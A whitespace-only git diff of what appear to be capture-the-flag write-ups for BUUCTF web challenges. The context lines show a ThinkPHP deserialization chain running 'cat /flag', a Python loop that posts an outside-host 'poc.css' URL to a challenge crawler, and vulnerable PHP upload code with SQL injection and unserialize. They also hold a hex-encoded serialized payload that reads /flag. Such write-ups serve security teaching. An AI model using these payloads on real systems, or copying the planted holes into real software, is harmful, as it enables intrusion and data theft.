@@ -251,9 +251,9 @@ EXP
 
 ```php
 <?php
- 
+
 namespace think\model\concern;
- 
+
 trait Attribute
 {
     private $data = ["key" => ["key1" => "cat /flag"]];
@@ -261,7 +261,7 @@ trait Attribute
     protected $json = ["key"];
 }
 namespace think;
- 
+
 abstract class Model
 {
     use model\concern\Attribute;
@@ -281,11 +281,11 @@ abstract class Model
         $this->jsonAssoc = true;
     }
 }
- 
+
 namespace think\model;
- 
+
 use think\Model;
- 
+
 class Pivot extends Model
 {
 }
@@ -384,7 +384,7 @@ session = requests.session()
 while 1:
     burp0_url = "http://bfa1cf93-5255-43b9-9cb0-873114a61c0b.node5.buuoj.cn:81/crawl.html"
     burp0_cookies = {"UM_distinctid": "176929086fa3a0-0b0ed985080c69-163b6153-13c680-176929086fb472", "_ga": "GA1.2.602800589.1608776974", "_gid": "GA1.2.1740085603.1609750409"}
-    burp0_headers = {"Pragma": "no-cache", "Cache-Control": "no-cache", "Upgrade-Insecure-Requests": "1", 	  "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "Origin": "http://2c1fe10e-fee9-4956-b0f4-f87a2de7a0dc.node3.buuoj.cn", "Content-Type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://2c1fe10e-fee9-4956-b0f4-f87a2de7a0dc.node3.buuoj.cn/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
+    burp0_headers = {"Pragma": "no-cache", "Cache-Control": "no-cache", "Upgrade-Insecure-Requests": "1",       "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "Origin": "http://2c1fe10e-fee9-4956-b0f4-f87a2de7a0dc.node3.buuoj.cn", "Content-Type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://2c1fe10e-fee9-4956-b0f4-f87a2de7a0dc.node3.buuoj.cn/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
     burp0_data = {"css": "http://27.25.151.48:999/poc.css"}
     session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
     time.sleep(0.6)
@@ -442,95 +442,95 @@ app.run(host='0.0.0.0', port=999)
 ```php
 <?php
 class helper {
-	protected $folder = "pic/";
-	protected $ifview = False; 
-	protected $config = "config.txt";
-	// The function is not yet perfect, it is not open yet.
+    protected $folder = "pic/";
+    protected $ifview = False; 
+    protected $config = "config.txt";
+    // The function is not yet perfect, it is not open yet.
 
-	public function upload($input="file")
-	{
-		$fileinfo = $this->getfile($input);
-		$array = array();
-		$array["title"] = $fileinfo['title'];
-		$array["filename"] = $fileinfo['filename'];
-		$array["ext"] = $fileinfo['ext']; //拓展名
-		$array["path"] = $fileinfo['path'];
-		$img_ext = getimagesize($_FILES[$input]["tmp_name"]);    //获得图片信息
-		$my_ext = array("width"=>$img_ext[0],"height"=>$img_ext[1]);
-		$array["attr"] = serialize($my_ext);
-		$id = $this->save($array);
-		if ($id == 0){
-			die("Something wrong!");
-		}
-		echo "<br>";
-		echo "<p>Your images is uploaded successfully. And your image's id is $id.</p>";
-	}
+    public function upload($input="file")
+    {
+        $fileinfo = $this->getfile($input);
+        $array = array();
+        $array["title"] = $fileinfo['title'];
+        $array["filename"] = $fileinfo['filename'];
+        $array["ext"] = $fileinfo['ext']; //拓展名
+        $array["path"] = $fileinfo['path'];
+        $img_ext = getimagesize($_FILES[$input]["tmp_name"]);    //获得图片信息
+        $my_ext = array("width"=>$img_ext[0],"height"=>$img_ext[1]);
+        $array["attr"] = serialize($my_ext);
+        $id = $this->save($array);
+        if ($id == 0){
+            die("Something wrong!");
+        }
+        echo "<br>";
+        echo "<p>Your images is uploaded successfully. And your image's id is $id.</p>";
+    }
 
-	public function getfile($input)
-	{
-		if(isset($input)){
-			$rs = $this->check($_FILES[$input]);
-		}
-		return $rs;
-	}
+    public function getfile($input)
+    {
+        if(isset($input)){
+            $rs = $this->check($_FILES[$input]);
+        }
+        return $rs;
+    }
 
-	public function check($info)
-	{
-		$basename = substr(md5(time().uniqid()),9,16);
-		$filename = $info["name"];
-		$ext = substr(strrchr($filename, '.'), 1);
-		$cate_exts = array("jpg","gif","png","jpeg");
-		if(!in_array($ext,$cate_exts)){
-			die("<p>Please upload the correct image file!!!</p>");
-		}
-	    $title = str_replace(".".$ext,'',$filename);
-	    return array('title'=>$title,'filename'=>$basename.".".$ext,'ext'=>$ext,'path'=>$this->folder.$basename.".".$ext);
-	}
+    public function check($info)
+    {
+        $basename = substr(md5(time().uniqid()),9,16);
+        $filename = $info["name"];
+        $ext = substr(strrchr($filename, '.'), 1);
+        $cate_exts = array("jpg","gif","png","jpeg");
+        if(!in_array($ext,$cate_exts)){
+            die("<p>Please upload the correct image file!!!</p>");
+        }
+        $title = str_replace(".".$ext,'',$filename);
+        return array('title'=>$title,'filename'=>$basename.".".$ext,'ext'=>$ext,'path'=>$this->folder.$basename.".".$ext);
+    }
 
-	public function save($data)
-	{
-		if(!$data || !is_array($data)){
-			die("Something wrong!");
-		}
-		$id = $this->insert_array($data);
-		return $id;
-	}
+    public function save($data)
+    {
+        if(!$data || !is_array($data)){
+            die("Something wrong!");
+        }
+        $id = $this->insert_array($data);
+        return $id;
+    }
 
-	public function insert_array($data)
-	{	
-		$con = mysqli_connect("127.0.0.1","r00t","r00t","pic_base");
-		if (mysqli_connect_errno($con)) 
-		{ 
-		    die("Connect MySQL Fail:".mysqli_connect_error());
-		}
-		$sql_fields = array();
-		$sql_val = array();
-		foreach($data as $key=>$value){
-			$key_temp = str_replace(chr(0).'*'.chr(0), '\0\0\0', $key);
-			$value_temp = str_replace(chr(0).'*'.chr(0), '\0\0\0', $value);
-			$sql_fields[] = "`".$key_temp."`";
-			$sql_val[] = "'".$value_temp."'";
-		}
-		$sql = "INSERT INTO images (".(implode(",",$sql_fields)).") VALUES(".(implode(",",$sql_val)).")";
-		mysqli_query($con, $sql);
-		$id = mysqli_insert_id($con);
-		mysqli_close($con);
-		return $id;
-	}
+    public function insert_array($data)
+    {    
+        $con = mysqli_connect("127.0.0.1","r00t","r00t","pic_base");
+        if (mysqli_connect_errno($con)) 
+        { 
+            die("Connect MySQL Fail:".mysqli_connect_error());
+        }
+        $sql_fields = array();
+        $sql_val = array();
+        foreach($data as $key=>$value){
+            $key_temp = str_replace(chr(0).'*'.chr(0), '\0\0\0', $key);
+            $value_temp = str_replace(chr(0).'*'.chr(0), '\0\0\0', $value);
+            $sql_fields[] = "`".$key_temp."`";
+            $sql_val[] = "'".$value_temp."'";
+        }
+        $sql = "INSERT INTO images (".(implode(",",$sql_fields)).") VALUES(".(implode(",",$sql_val)).")";
+        mysqli_query($con, $sql);
+        $id = mysqli_insert_id($con);
+        mysqli_close($con);
+        return $id;
+    }
 
-	public function view_files($path){
-		if ($this->ifview == False){
-			return False;
-			//The function is not yet perfect, it is not open yet.
-		}
-		$content = file_get_contents($path);
-		echo $content;
-	}
+    public function view_files($path){
+        if ($this->ifview == False){
+            return False;
+            //The function is not yet perfect, it is not open yet.
+        }
+        $content = file_get_contents($path);
+        echo $content;
+    }
 
-	function __destruct(){
-		# Read some config html
-		$this->view_files($this->config);
-	}
+    function __destruct(){
+        # Read some config html
+        $this->view_files($this->config);
+    }
 }
 
 ?>
@@ -543,43 +543,43 @@ class helper {
 include("./helper.php");
 $show = new show();
 if($_GET["delete_all"]){
-	if($_GET["delete_all"] == "true"){
-		$show->Delete_All_Images();
-	}
+    if($_GET["delete_all"] == "true"){
+        $show->Delete_All_Images();
+    }
 }
 $show->Get_All_Images();
 
 class show{
-	public $con;
+    public $con;
 
-	public function __construct(){
-		$this->con = mysqli_connect("127.0.0.1","r00t","r00t","pic_base");
-		if (mysqli_connect_errno($this->con)){ 
-   			die("Connect MySQL Fail:".mysqli_connect_error());
-		}
-	}
+    public function __construct(){
+        $this->con = mysqli_connect("127.0.0.1","r00t","r00t","pic_base");
+        if (mysqli_connect_errno($this->con)){ 
+               die("Connect MySQL Fail:".mysqli_connect_error());
+        }
+    }
 
-	public function Get_All_Images(){
-		$sql = "SELECT * FROM images";
-		$result = mysqli_query($this->con, $sql);
-		if ($result->num_rows > 0){     //有返回行
-		    while($row = $result->fetch_assoc()){
-		    	if($row["attr"]){
-		    		$attr_temp = str_replace('\0\0\0', chr(0).'*'.chr(0), $row["attr"]); //替换用来处理protected
-					$attr = unserialize($attr_temp);
-				}
-		        echo "<p>id=".$row["id"]." filename=".$row["filename"]." path=".$row["path"]."</p>";
-		    }
-		}else{
-		    echo "<p>You have not uploaded an image yet.</p>";
-		}
-		mysqli_close($this->con);
-	}
+    public function Get_All_Images(){
+        $sql = "SELECT * FROM images";
+        $result = mysqli_query($this->con, $sql);
+        if ($result->num_rows > 0){     //有返回行
+            while($row = $result->fetch_assoc()){
+                if($row["attr"]){
+                    $attr_temp = str_replace('\0\0\0', chr(0).'*'.chr(0), $row["attr"]); //替换用来处理protected
+                    $attr = unserialize($attr_temp);
+                }
+                echo "<p>id=".$row["id"]." filename=".$row["filename"]." path=".$row["path"]."</p>";
+            }
+        }else{
+            echo "<p>You have not uploaded an image yet.</p>";
+        }
+        mysqli_close($this->con);
+    }
 
-	public function Delete_All_Images(){
-		$sql = "DELETE FROM images";
-		$result = mysqli_query($this->con, $sql);
-	}
+    public function Delete_All_Images(){
+        $sql = "DELETE FROM images";
+        $result = mysqli_query($this->con, $sql);
+    }
 }
 ?>
 ```
@@ -590,18 +590,18 @@ class show{
 <?php
 include("./helper.php");
 class upload extends helper {
-	public function upload_base(){
-		$this->upload();
-	}
+    public function upload_base(){
+        $this->upload();
+    }
 }
 
 if ($_FILES){
-	if ($_FILES["file"]["error"]){
-		die("Upload file failed.");
-	}else{
-		$file = new upload();
-		$file->upload_base();
-	}
+    if ($_FILES["file"]["error"]){
+        die("Upload file failed.");
+    }else{
+        $file = new upload();
+        $file->upload_base();
+    }
 }
 
 $a = new helper();
@@ -650,7 +650,7 @@ O:6:"helper":2:{s:9:"\0\0\0ifview";b:1;s:9:"\0\0\0config";s:5:"/flag";}
 0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d
 ```
 
-```
+```http
 Request:
 
 POST /upload.php HTTP/1.1
